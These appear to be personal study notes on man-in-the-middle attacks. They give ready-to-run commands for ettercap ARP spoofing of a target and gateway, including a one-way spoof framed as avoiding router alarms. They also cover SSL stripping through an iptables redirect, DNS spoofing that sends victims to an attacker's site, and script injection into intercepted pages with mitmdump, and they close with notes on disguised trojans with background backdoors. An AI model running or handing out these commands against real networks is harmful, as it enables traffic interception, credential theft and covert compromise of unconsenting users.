#Ettercap
Tool for the mitm attacks
leaf /etc/ettercap/etter.conf		//opening the conf file for editing
edit the ip tables line and remove the comment from the two lines
and also at the start only change the "euid" to 0 for no errors.

We can use help options 				//ettercap --help
we can also have the user interface		//ettercap -Tq
eg--ettercap -Tq -M arp:remote /192.168.1.1(gateway)//	/192.168.1.15(target)//


#Not triggering any alarm in the router---
To not trigger the alarm in the router we can use one way arp spoof so that we just tell the victim that we are router and we will redirect for you and then we send the request to the real router and then it will send the response to both of the host and thus we will be able to capture the details and not triggering any alarm
ettercap -Tq -M arp:oneway -S /192.168.1.9(target)//	/192.168.1.1(router)//




#Downgrading https to http-(sslstrip)
but one problem is there that it uses port 10000, so we need to redirect traffic from 80 to 10000 using iptables

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip														//it will start running
ettercap -Tq -M arp:remote -S /192.168.1.1(gateway)//	/192.168.1.15(target)//
(-S to tell ettercap to do not use anything for downgrading as sslstrip is working)
iptables -t nat --flush										//flushing the iptables entry at the end	

We can use ettercap plugins like "autoadd"	for adding the hosts even if we pass the command and we are in the mitm
We can also use plugin like "dns_spoof" but we need to edit the etter.dns from /etc/ettercap/etter.dns and then pass the dns entries.
Then whenever the user opens that particular website, then it will be redirected to our website hosted on the server











#Man in the Middle Proxy						//mitmproxy(github)
Use to intercept,analyse,modify and replay packet flows			//it can't be done by ettercap
Supports a no. of proxy modes
TLS cert generation

Uses two operation modes---
Explicit--user connects directly to the proxy
Transparent--data is redirected to the proxy

./mitmweb							//runs explicit as default modes
and also make changes to the proxy settings in the firefox and set the proxy to 127.0.0.1:8080
Now we can have the mitmweb running on the web and then we can filter the search based on the languages
Intercept any url	-----			/*	(intecept get and post request)




#Now using transparent mode--
run the ettercap for arp spoof
then redirect all the traffic from port 80 to 8080 where the mitmproxy will be running
and then run the mitmproxy
./mitmweb --transparent
and then intercept the things you want and do not forget to flush the ip tables


We can also replace using regex so we need to use command line to replace
./mitmdump --transparent --replace :~bs:"</body>":"<script>alert(1)</script></body>" 			and this same as mitmweb



##Mitmproxy scripts---use library mitmproxy (python) to make the script
We can't use "sslstrip" proxy with the mitmproxy as it can't hold for the transparent proxy
But we can include the script of sslstrip which is available with the mitmproxy(github)






#Trojans--It is a file that looks and functions as a normal file(image,pdf,song)
When executed--
Opens the normal file and the backdoor runs at background

>>Trojan factory(github)
and the other scripts are also available
